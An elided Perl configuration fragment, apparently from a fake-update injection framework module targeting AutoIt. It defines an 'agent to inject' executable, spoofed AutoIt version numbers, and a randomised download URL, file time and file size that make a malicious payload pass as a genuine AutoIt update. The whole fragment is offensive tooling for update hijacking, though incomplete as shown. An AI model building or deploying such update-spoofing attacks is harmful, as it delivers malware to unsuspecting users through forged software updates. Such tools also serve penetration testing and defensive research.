...
my $base=
{
    ...
    'options' => {  'agent'  => { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject'},
    		    'enable' => { 'val' => 1, 
                    ...
                    'version_stable' => { 'val' => '4.2.14.1',
                				 'desc' => 'AutoIt Stable Version' },
                    'version_beta' => { 'val' => '4.2.15.1',
                				 'desc' => 'AutoIt Beta Version' },

                    'url'  => { 'val' => "'http://www.autoitscript.com/files/autoit/autoit-'.isrcore::utils::RndAlpha(isrcore::utils::RndNum(1)).'.exe'",
                                 'hidden' => 1,
				'dynamic' =>1,},                                                                                       			    	  
	            'filetime' => { 'val' => " '20080'.isrcore::utils::RndNum(1) . isrcore::utils::RndNum(7,1,2)  ",
	                      'dynamic' => 1 },                                                        				                                                                    			    	  
	            'filesize' => { 'val' => " '2'.isrcore::utils::RndNum(5) ",
	                      'dynamic' => 1 },                                                        				                                                                    			    	  
		 }
};
